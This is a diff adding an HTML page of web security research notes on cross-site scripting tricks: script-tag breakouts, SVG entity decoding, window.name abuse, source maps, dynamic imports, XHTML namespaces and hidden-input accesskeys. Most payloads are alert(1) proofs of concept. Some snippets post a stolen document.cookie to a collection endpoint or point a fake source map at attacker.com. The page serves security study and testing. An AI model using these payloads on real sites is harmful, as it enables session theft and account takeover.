@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Tricks — DOM Security Research</title>
+  <meta name="description" content="Research on advanced XSS techniques and bypasses.">
+  <link rel="stylesheet" href="../../style.css">
+  <link rel="stylesheet" href="../dom-styles.css">
+</head>
+<body>
+  <header>
+    <div class="header-inner">
+      <a class="logo" href="../">
+        <div>
+          <div class="logo-text">XSS</div>
+          <div class="logo-sub">Tricks</div>
+        </div>
+      </a>
+      <div class="header-stats">
+        <div class="stat-pill">TOPIC <span>XSS</span></div>
+      </div>
+    </div>
+  </header>
+
+  <main class="topic-wrap">
+      <h1 class="topic-title">XSS Tricks</h1>
+      <p class="topic-desc">Advanced XSS edge cases involving script parsing, SVG, window.name, source maps, dynamic imports and XML namespaces.</p>
+
+      <article class="vuln-card found">
+        <div class="obsidian-note">
+    <h2>Closing scripts</h2>
+
+    <p>If the input is reflected into a JavaScript variable inside double quotes, and the quotes themselves are properly escaped but characters such as <code>&lt;</code> and <code>&gt;</code> are not, it may still be possible to break out of the script context and achieve a successful XSS payload just by closing the script tag .</p>
+
+    <pre><code class="language-js">&lt;script&gt;
+  let foo = "&lt;/script&gt;&lt;img/src/onerror=alert(1)&gt;";
+  &lt;/script&gt;</code></pre>
+
+    <h2>Comments inside scripts</h2>
+
+    <p>If there are two injection points, one inside a JavaScript variable and another inside an HTML attribute, we can abuse how browsers parse <code>&lt;script&gt;</code> tags to achieve XSS .</p>
+
+    <pre><code class="language-js">&lt;script&gt;
+  let foo = "input1";
+  &lt;/script&gt;
+  &lt;img title="input2"&gt;</code></pre>
+
+    <p>On the example above we can se two script tag and two inputs that escape <code>"</code> and <code>/</code>.</p>
+
+    <p>The XSS payload looks like this :</p>
+    <pre><code class="language-js">&lt;script&gt;
+  let foo = "&lt;!--&lt;script&gt;";
+  &lt;/script&gt;
+  &lt;img title="&lt;/script&gt;&lt;img/src/onerror=alert(1)&gt;"&gt;</code></pre>
+
+    <p>How does this work? In some browsers, when an HTML comment (<code>&lt;!--</code>) is injected inside a <code>&lt;script&gt;</code> tag followed by another <code>&lt;script&gt;</code> tag, the browser enters a legacy parsing state known as “script data escaped state”. In this state, the first <code>&lt;/script&gt;</code> is no longer treated as a valid closing tag, so the browser continues parsing until it finds another <code>&lt;/script&gt;</code>. The attacker places that second closing tag inside the <code>title</code> attribute, which finally closes the script block and causes <code>&lt;img/src/onerror=alert(1)&gt;</code> to be interpreted as real HTML, resulting in XSS execution.</p>
+
+    <h2>SVG shitty things</h2>
+
+    <p>Imagine this scenario: the user input is properly escaped, so the developer believes it is safe. However, this is not always true when the input is placed inside an SVG tag. Since SVG is XML-based, parsing behaves differently. Entities such as <code>&amp;quot;</code> are automatically decoded into <code>"</code> before the content reaches the JavaScript parser. This means that even if the input was HTML-escaped, the SVG parser will decode those characters first, potentially breaking out of the JavaScript string and leading to XSS, like this:</p>
+
+    <pre><code class="language-js">&lt;svg&gt;
+  &lt;script&gt;let foo = "&amp;quot;-alert(1)///";&lt;/script&gt;
+  &lt;/svg&gt;</code></pre>
+
+    <p>Another trick with SVG tags is that you can close a script tag without an actual closing script tag just by using svg and firefox :</p>
+
+    <pre><code class="language-js">&lt;svg&gt;&lt;script href=data:,alert(1) /&gt;</code></pre>
+
+    <h2>Window.name</h2>
+
+    <p><code>window.name</code> survives page navigations. This means that if a value is assigned to <code>window.name</code> on <code>example.com</code>, and the user later navigates to <code>example2.com</code>, the value of <code>window.name</code> will still persist and can be accessed by the new page.</p>
+
+    <p><code>window.name</code> is not dangerous by itself. The real issue appears when a website uses it inside dangerous JavaScript sinks such as <code>eval()</code>, or it's used to store sensitive data.</p>
+
+    <p>Example:</p>
+    <p>ATTACKER WEB:</p>
+    <pre><code class="language-js">&lt;iframe src="//victim.com" name="alert(1)"&gt;&lt;/iframe&gt;</code></pre>
+
+    <p>Here, the iframe’s <code>name</code> attribute becomes <code>window.name</code> inside <code>victim.com</code></p>
+
+    <p>VICTIM WEB:</p>
+    <pre><code class="language-js">&lt;script&gt;
+  	eval(name)
+  &lt;/script&gt;</code></pre>
+
+    <p>This will pop-up an alert(1)</p>
+
+    <p>Same primitive can be used if any confidential data is stored inside <code>window.name</code>, for example:</p>
+
+    <p>VICTIM WEB:</p>
+    <pre><code class="language-js">&lt;script&gt;
+  name = document.cookie
+  &lt;/script&gt;</code></pre>
+
+    <p>ATTACKER WEB:</p>
+    <pre><code class="language-js">&lt;script&gt;
+
+  fetch('/collect-cookie', {
+    method:"post",
+    body:name
+  })
+
+  &lt;/script&gt;</code></pre>
+
+    <p>With this we've successfully hijacked victim's cookies</p>
+
+    <h2>Source map</h2>
+
+    <p>Imagine we have reflected input inside a js comment</p>
+    <pre><code class="language-js">// USER_INPUT</code></pre>
+
+    <p>Then we can inject a fake source map like this :</p>
+    <pre><code class="language-js">//# sourceMappingURL=https://attacker.com</code></pre>
+
+    <p>With this we could exfiltrate cookies etc, the only thing is that for this exploit to function the victim should open devtools</p>
+
+    <h2>Dynamic imports</h2>
+
+    <p>We can execute JS using import</p>
+    <pre><code class="language-js">import('data:text/javascript,alert(1)')</code></pre>
+
+    <h2>XHTML namespace in XML</h2>
+
+    <p>If we have control over an XML document with content-type text/xml we can execute JavaScript if we provide an XHTML namespace</p>
+    <pre><code class="language-js">&lt;xml&gt;
+  &lt;text&gt;hello&lt;img src="1" onerror="alert(1)"xmlns="http://www.w3.org/1999/xhtml"/&gt;&lt;/text&gt;
+  &lt;/xml&gt;</code></pre>
+
+    <h2>XSS in hidden inputs</h2>
+
+    <p>In hidden inputs a way to execute JS is by using accesskey that when certain key is pressed by the victim the script will execute :</p>
+    <pre><code class="language-js">&lt;input type="hidden" accesskey="X" onclick="alert(1)"&gt;</code></pre>
+
+    <p>This will pop-up an alert if the user press ALT + SHIFT + X or CTRL + ALT + X , this also works on other atributtes such as link :</p>
+    <pre><code class="language-js">&lt;link rel="canonical" accesskey="X" onclick="alert(1)" /&gt;</code></pre>
+        </div>
+      </article>
+
+    <a class="back-btn" href="../">← Back to DOM Research</a>
+  </main>
+</body>
+</html>
